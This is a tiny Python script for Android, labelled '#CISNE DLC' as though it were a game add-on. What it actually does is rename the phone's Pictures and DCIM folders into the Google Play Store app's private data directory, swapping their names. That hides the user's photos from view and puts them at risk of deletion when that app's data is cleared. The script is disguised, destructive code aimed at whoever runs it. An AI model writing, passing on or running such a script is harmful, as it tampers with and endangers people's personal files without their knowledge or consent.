#CISNE DLC
import os
import sys
import time
import androidhelper
os.rename("/sdcard/Pictures", "/sdcard/Android/data/com.android.vending/DCIM")
os.rename("/sdcard/DCIM", "/sdcard/Android/data/com.android.vending/Pictures")